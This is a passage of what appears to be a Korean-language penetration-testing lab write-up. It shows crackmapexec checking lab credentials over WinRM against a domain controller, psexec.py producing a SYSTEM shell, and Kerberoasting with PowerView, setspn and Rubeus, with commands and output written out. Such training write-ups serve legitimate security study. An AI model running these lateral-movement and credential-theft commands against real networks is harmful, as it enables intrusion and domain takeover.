$ crackmapexec winrm 172.16.5.5 -u sqldev -p 'database!'                                                       
WINRM       172.16.5.5      5985   ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL)
WINRM       172.16.5.5      5985   ACADEMY-EA-DC01  [*] http://172.16.5.5:5985/wsman
WINRM       172.16.5.5      5985   ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\sqldev:database! (Pwn3d!)
```

흠 이렇게 wim으로 들어갈수있고 pwn3d가 떴다 얘는 관리자라는 뜻이다.

혹시모르니 접속해봄:

```bash
$ psexec.py 'INLANEFREIGHT.LOCAL/sqldev:database!@172.16.5.5'

Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
nt authority\system
```

이처럼 dc01에서 system 권한을 획득했다.

이정도면 그냥 도메인 어드민 먹힌거나 다름없다.

## Kerberoasting - Windows

윈도우에서 크랙이 가능하다.

우선 위에 방금 본 툴인 파워뷰 툴을 활용하여 사용자 spn 달린거를 가져올수있따:

![Active Directory](/assets/cpts-infra/active-directory-credentialed-enumeration-and-kerberos-attacks/ad12.png)

그리고 이 사용자에 해당하는 spn을 가져올수있다:

![Active Directory](/assets/cpts-infra/active-directory-credentialed-enumeration-and-kerberos-attacks/ad13.png)

그리고 대안으로 setspn 툴을 활용할수도 있다.

그리고 대중적인 rebeus.exe 툴이 존재한다.

이 툴은 해시는 물론 티켓까지 뽑아올수있다.

걍 이번엔 spn 달린 해시를 캐오는 방식으로 실습을 한다.

이처럼 sqldev 상대로 해시를 가져오게 할수있다:

```powershell
PS C:\tools> .\Rubeus.exe kerberoast /user:sqldev /nowrap
```

![Active Directory](/assets/cpts-infra/active-directory-credentialed-enumeration-and-kerberos-attacks/ad14.png)